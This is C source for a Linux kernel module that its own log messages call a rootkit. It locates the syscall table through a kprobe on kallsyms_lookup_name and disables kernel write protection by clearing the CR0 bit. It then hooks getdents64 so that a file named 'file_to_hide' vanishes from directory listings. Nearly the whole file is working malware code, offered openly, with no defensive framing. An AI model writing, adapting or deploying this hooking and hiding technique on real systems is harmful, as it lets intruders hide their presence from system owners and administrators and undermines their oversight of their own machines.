#include <linux/init.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/dirent.h>
#include <linux/syscalls.h>
#include <linux/kprobes.h>
#include <asm/paravirt.h>
#include <linux/uaccess.h>
#include "include/ghost.h"

MODULE_AUTHOR("Ch4r0nN");
MODULE_LICENSE("GPL");
MODULE_VERSION("0.0.0.3");

static inline void write_cr0_forced(unsigned long value)
{
    asm volatile("mov %0, %%cr0" : "+r"(value), "+m"(__force_order));
}

static inline void protect_memory(void)
{
    write_cr0_forced(cr0);
}

static inline void unprotect_memory(void)
{
    write_cr0_forced(cr0 & ~0x00010000);
}

unsigned long *
find_syscall_table(void)
{
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);

    kallsyms_lookup_name_t kallsyms_lookup_name;

    register_kprobe(&kp);

    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;

    unregister_kprobe(&kp);

    __syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");

    return __syscall_table;
}

asmlinkage int (*orig_getdents64)(unsigned int, struct linux_dirent64 *, unsigned int);

asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
    int ret = orig_getdents64(fd, dirp, count);
    struct linux_dirent64 *d, *kd, *kdirent = NULL;
    unsigned long offset = 0;

    if (ret <= 0)
        return ret;

    kdirent = kzalloc(ret, GFP_KERNEL);
    if (kdirent == NULL)
        return ret;

    if (copy_from_user(kdirent, dirp, ret)) {
        kfree(kdirent);
        return ret;
    }

    while (offset < ret) {
        d = (struct linux_dirent64 *)((char *)kdirent + offset);
        if (strcmp(d->d_name, "file_to_hide") == 0) {
            memmove(d, (char *)d + d->d_reclen, ret - offset - d->d_reclen);
            ret -= d->d_reclen;
        } else {
            offset += d->d_reclen;
        }
    }

    copy_to_user(dirp, kdirent, ret);
    kfree(kdirent);
    return ret;
}

static int __init ghost_init(void)
{
    __syscall_table = find_syscall_table();
    if (!__syscall_table) {
        printk(KERN_INFO "Error, syscall_table not found");
        return -1;
    }

    cr0 = read_cr0();
    orig_getdents64 = (void *)__syscall_table[MY_NR_getdents];
    unprotect_memory();
    __syscall_table[MY_NR_getdents] = (unsigned long)hook_getdents64;
    protect_memory();

    printk(KERN_INFO "Rootkit loaded: Syscall hooked\n");
    return 0;
}

static void __exit ghost_exit(void)
{
    unprotect_memory();
    __syscall_table[MY_NR_getdents] = (unsigned long)orig_getdents64;
    protect_memory();

    printk(KERN_INFO "Rootkit unloaded: Syscall restored\n");
}

module_init(ghost_init);
module_exit(ghost_exit);
